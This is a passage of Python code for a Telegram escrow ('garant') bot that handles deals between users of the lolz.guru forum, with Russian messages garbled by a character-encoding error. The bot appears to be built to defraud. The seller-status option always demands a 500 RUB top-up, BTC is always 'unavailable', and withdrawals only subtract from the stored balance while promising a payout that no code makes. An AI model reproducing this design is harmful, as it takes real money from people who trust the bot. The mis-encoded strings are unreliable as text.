–ü–µ—Ä–µ–¥ –æ—Ç–∫—Ä—ã—Ç–∏–µ–º —Å–ø–æ—Ä–∞ —É –í–∞—Å –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –≤—Å–µ –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–∞, –≤–∫–ª—é—á–∞—è —Å–∫—Ä–∏–Ω—ã, –ª–∏–±–æ –≤–∏–¥–µ–æ –ø–µ—Ä–µ–ø–∏—Å–∫–∏, –≥–¥–µ —Ç–∞–∫–∂–µ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–∞–ø–µ—á–∞—Ç–ª—ë–Ω –ø—Ä–æ—Ñ–∏–ª—å –ø—Ä–æ–¥–∞–≤—Ü–∞!''', reply_markup=k.back, parse_mode='Markdown')


		# –û—Ç–∑—ã–≤—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
		elif call.data == 'otzivi':
			bot.send_message(call.message.chat.id, 'üí´ *–û—Ç–∑—ã–≤—ã:* \n–ü—É—Å—Ç–æ', parse_mode='Markdown')

		# –°—Ç–∞—Ç—å –ø—Ä–æ–¥–∞–≤—Ü–æ–º
		elif call.data == 'new_seller':
			bot.send_message(call.message.chat.id, '*–ù–µ —Ö–≤–∞—Ç–∞–µ—Ç —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ –≥–∞—Ä–∞–Ω—Ç –±–æ—Ç–∞* üòî \n\n`–ü–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å –≥–∞—Ä–∞–Ω—Ç –±–æ—Ç–∞ –Ω–∞ 500 RUB, –¥–ª—è –æ–ø–ª–∞—Ç—ã –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ —Å—Ç–∞—Ç—É—Å–∞ —Å–µ–ª–ª–µ—Ä–∞`', parse_mode='Markdown')

		# –û—Ç–∫—Ä—ã—Ç—å –Ω–æ–≤—É—é —Å–¥–µ–ª–∫—É
		elif 'new_sdelka' in call.data:
			ids = call.data.split('-')[1]
			main_search_method = types.InlineKeyboardMarkup(row_width=1)
			bot.send_message(call.message.chat.id, f'ü§ñ –ü—Ä–æ–¥–∞–≤–µ—Ü - `{ids}`', parse_mode='Markdown', reply_markup=main_search_method.add(inbutton('RUB (üá∑üá∫)', 'rub-' + call.data.split('-')[1]), inbutton('BTC (‚Çø)', 'btc')))

		# –†—É–±–ª—å —Å–¥–µ–ª–∫–∞
		elif 'rub' in call.data:
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			cur.execute(f'INSERT INTO sdelki VALUES(?, ?, ?, ?, ?, ?, ?);', (random.randint(10000, 15000), cur.execute('SELECT username FROM users WHERE userid = (?);', (call.data.split('-')[1],)).fetchone()[0], call.data.split('-')[1], cur.execute('SELECT username FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0], call.message.chat.id, 0.0, '–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç'))
			conn.commit()
			bot.register_next_step_handler(bot.send_message(call.message.chat.id, f'''
	–°–æ–∑–¥–∞–Ω–∏–µ —Å–¥–µ–ª–∫–∏: *RUB* (üá∑üá∫)

	–í–∞—à –±–∞–ª–∞–Ω—Å: `{balance}` *RUB*
	‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
	üßæ _–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏:_''', parse_mode='Markdown'), new_sdelka)

		# –ë–∏—Ç–∫–æ–∏–Ω
		elif call.data == 'btc':
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_–ü–ª–∞—Ç–µ–∂–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ BITCOIN –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç. –ü—Ä–∏–Ω–æ—Å–∏–º —Å–≤–æ–∏ –∏–∑–≤–∏–Ω–µ–Ω–∏—è._', parse_mode='Markdown')

		# –ù–∞–∑–∞–¥
		elif call.data == 'back':
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
			bot.send_message(call.message.chat.id, '‚ùï _–ü–æ–∑–Ω–∞–≤–∞—Ç–µ–ª—å–Ω–∞—è –≤–∫–ª–∞–¥–∫–∞_', reply_markup=k.main_help, parse_mode='Markdown')
		elif call.data == 'back_profile':
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			link = cur.execute('SELECT link FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			bot.send_message(call.message.chat.id, f'''
‚åöÔ∏è *–ü—Ä–æ—Ñ–∏–ª—å*
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ

ü§ñ *–í–∞—à ID* - `{call.message.chat.id}`
üõ∏ *–í–∞—à –ª–∏–Ω–∫ –Ω–∞ —Ñ–æ—Ä—É–º–µ:
üåé {link}*

*–í–∞—à –±–∞–ª–∞–Ω—Å:* {balance} RUB
*–í–∞—à –±–∞–ª–∞–Ω—Å BTC:* 0.0 BTC (~0.0 RUB)
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üéÅ *–ö–æ–ª-–≤–æ –ø—Ä–æ–¥–∞–∂:* 0 —à—Ç
üõí *–ö–æ–ª-–≤–æ –ø–æ–∫—É–ø–æ–∫:* 0 —à—Ç
üì• *–°—É–º–º–∞ –ø—Ä–æ–¥–∞–∂:* 0 RUB | 0 BTC (~0 RUB)
üì§ *–°—É–º–º–∞ –ø–æ–∫—É–ø–æ–∫:* 0 RUB | 0 BTC (~0 RUB)

üöÄ *–ù–∞—à –∫—É—Ä—Å BTC:* `7079853,34` RUB''', reply_markup=k.main_profile, parse_mode='Markdown')


def search(message):
	try:
		userid = cur.execute('SELECT userid FROM users WHERE username = (?);', (message.text,)).fetchone()[0]
		link = cur.execute('SELECT link FROM users WHERE username = (?);', (message.text,)).fetchone()[0]
		bot.send_message(message.chat.id, f'''
üîç *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:* {message.text}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ

ü§ñ *ID* - `{userid}`
üõ∏ *–õ–∏–Ω–∫ –Ω–∞ —Ñ–æ—Ä—É–º–µ:
üåé {link}*

‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üéÅ *–ö–æ–ª-–≤–æ –ø—Ä–æ–¥–∞–∂:* 0 —à—Ç
üõí *–ö–æ–ª-–≤–æ –ø–æ–∫—É–ø–æ–∫:* 0 —à—Ç
üì• *–°—É–º–º–∞ –ø—Ä–æ–¥–∞–∂:* 0.0 RUB | 0 BTC (~0 RUB)
üì§ *–°—É–º–º–∞ –ø–æ–∫—É–ø–æ–∫:* 0 RUB | 0 BTC (~0 RUB)''', parse_mode='Markdown', reply_markup=k.main_search.add(inbutton('üöÄ –ù–∞—á–∞—Ç—å —Å–¥–µ–ª–∫—É', 'new_sdelka-' + str(userid))))

	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, '*–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω..*', parse_mode='Markdown')

def pay(message):
	link = 'https://qiwi.com/payment/form/99?extra%5B%27account%27%5D=' + str(cfg.phone) + '&amountInteger=' + message.text + '&amountFraction=0&extra%5B%27comment%27%5D=+' + str(message.chat.id) + '&currency=643&blocked[0]=account'
	bot.send_message(message.chat.id, '*–ì–æ—Ç–æ–≤–æ! –¢–µ–ø–µ—Ä—å –æ—Å—Ç–∞–ª–æ—Å—å –æ–ø–ª–∞—Ç–∏—Ç—å —Å—á—ë—Ç üöÄ* \n_–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –±–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞—á–∏—Å–ª–∏—Ç —Å—É–º–º—É –Ω–∞ –í–∞—à –±–∞–ª–∞–Ω—Å_', parse_mode='Markdown', reply_markup=types.InlineKeyboardMarkup(row_width=1).add(types.InlineKeyboardButton('–û–ø–ª–∞—Ç–∏—Ç—å —Å—á—ë—Ç', url=link)))

def outpay(message):
	try:
		balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
		number, summ = message.text.split(' ')
		if float(summ) > balance:
			bot.send_message(message.chat.id, '*–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ!*', parse_mode='Markdown')
		else:
			cur.execute('UPDATE users SET balance = (?) WHERE userid = (?);', (cur.execute('SELECT balance FROM users WHERE userid = (?)', (message.chat.id,)).fetchone()[0] - float(summ), message.chat.id))
			conn.commit()
			bot.send_message(message.chat.id, f'*–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ {summ} RUB –ø—Ä–∏–Ω—è—Ç–∞.* \n_–î–µ–Ω–µ–∂–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –≤—ã–≤–µ–¥–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤._', parse_mode='Markdown')
	except:
		bot.send_message(message.chat.id, '*–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥...*', parse_mode='Markdown')

def set_link(message):
	if 'https://lolz.guru' in message.text:
		cur.execute('UPDATE users SET link = (?) WHERE userid = (?);', (message.text, message.chat.id,))
		conn.commit()
		bot.send_message(message.chat.id, '–õ–∏–Ω–∫ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª—ë–Ω!')
	else:
		bot.send_message(message.chat.id, '*–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥...*', parse_mode='Markdown')

def new_sdelka(message):
	try:
		print(1)
		balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
		print(2)
		summ = float(message.text)

		if summ > balance:
			bot.send_message(message.chat.id, '*–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ!*', parse_mode='Markdown')
		else:
			cur.execute('UPDATE sdelki SET summ = (?) WHERE buyid = (?);', (summ, message.chat.id,))
			conn.commit()
			bot.register_next_step_handler(bot.send_message(message.chat.id, f'üìù _–í–≤–µ–¥–∏—Ç–µ —É—Å–ª–æ–≤–∏—è —Å–¥–µ–ª–∫–∏:_', parse_mode='Markdown'), set_desc)
	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, '*–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥...*', parse_mode='Markdown')

def set_desc(message):
	try:
		cur.execute('UPDATE sdelki SET description = (?) WHERE buyid = (?);', (message.text, message.chat.id,))
		conn.commit()
		sellid = cur.execute('SELECT sellid FROM sdelki WHERE buyid = (?);', (message.chat.id,)).fetchone()[0]
		i = cur.execute('SELECT * FROM sdelki WHERE buyid = (?);', (message.chat.id,)).fetchone()
		cur.execute('UPDATE users SET balance = (?) WHERE userid = (?);', (cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0] - i[5], message.chat.id,) )

		sdelka_menu = types.InlineKeyboardMarkup(row_width=2)
		sdelka_menu.add(inbutton('–û—Ç–º–µ–Ω–∏—Ç—å —Å–¥–µ–ª–∫—É', 'delete_sdelka-' + str(i[0])), inbutton('–û—Ç–∫—Ä—ã—Ç—å —Å–ø–æ—Ä', 'open_discussions-' + str(i[0])))

		bot.send_message(sellid, f'''
*‚Ññ —Å–¥–µ–ª–∫–∏*: `{i[0]}`

–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {i[3]} (`{i[4]}`)
–ü—Ä–æ–¥–∞–≤–µ—Ü: {i[1]} (`{i[2]}`)
*–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏:* `{i[5]}` *RUB*

–°—Ç–∞—Ç—É—Å: *–û—Ç–∫—Ä—ã—Ç–∞*''', parse_mode='Markdown')

		bot.send_message(message.chat.id, f'''
*‚Ññ —Å–¥–µ–ª–∫–∏*: `{i[0]}`

–ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {i[3]} (`{i[4]}`)
–ü—Ä–æ–¥–∞–≤–µ—Ü: {i[1]} (`{i[2]}`)
*–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏:* `{i[5]}` *RUB*

–°—Ç–∞—Ç—É—Å: *–û—Ç–∫—Ä—ã—Ç–∞*''', parse_mode='Markdown', reply_markup=sdelka_menu)
	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, '*–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥...*', parse_mode='Markdown')


for i in range(6):
	try:
		print('Bot Started!')
		bot.polling(none_stop=True)
	except:
		pass